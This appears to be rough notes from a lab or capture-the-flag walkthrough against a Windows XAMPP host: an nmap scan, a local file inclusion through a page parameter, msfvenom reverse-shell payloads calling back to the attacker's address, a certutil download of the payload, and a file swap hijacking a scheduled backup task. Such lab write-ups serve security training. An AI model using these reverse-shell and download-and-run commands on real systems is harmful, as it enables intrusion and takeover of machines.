```sh
nmap -sC -sV 192.168.140.53        
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-31 22:24 CST
Nmap scan report for 192.168.140.53
Host is up (0.042s latency).
Not shown: 993 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           FileZilla ftpd 0.9.41 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3306/tcp open  mysql?
| fingerprint-strings: 
|   GetRequest, JavaRMI, NULL, SIPOptions: 
|_    Host '192.168.49.140' is not allowed to connect to this MariaDB server
4443/tcp open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.140.53:4443/dashboard/
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
8080/tcp open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.140.53:8080/dashboard/
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.93%I=7%D=1/31%Time=63D9E99B%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.140'\x20is\x20not\x20al
SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(GetReques
SF:t,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.140'\x20is\x20not\x20all
SF:owed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(SIPOptions
SF:,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.140'\x20is\x20not\x20allo
SF:wed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(JavaRMI,4D,
SF:"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.140'\x20is\x20not\x20allowed\
SF:x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-02-01T04:25:20
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_clock-skew: 10s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.36 seconds
```

Found the following link `http://192.168.140.53:8080/site/services.php`
Found by visiting portfolios that I am able to change files
`http://192.168.140.53:8080/site/index.php?page=portfolio.php`
I first started by LFI. Realized I could read hosts.
`msfvenom -p php/reverse_php LHOST=192.168.49.140 LPORT=1234 -f raw > phpshell.php `
In the base of the C drive I found Backup
The info.txt reads that it runs ever 5 minutes.
I generated the payload
```
msfvenom -p windows/shell_reverse_tcp LHOST="192.168.49.140" LPORT=21 -f exe > TFTP.EXE
```
Download shell
```
certutil.exe -urlcache -split -f "http://192.168.49.140/TFTP.EXE"
```
`rename TFTP.EXE TFTP.OLD.EXE`
`rename shell.exe TFTP.EXE`

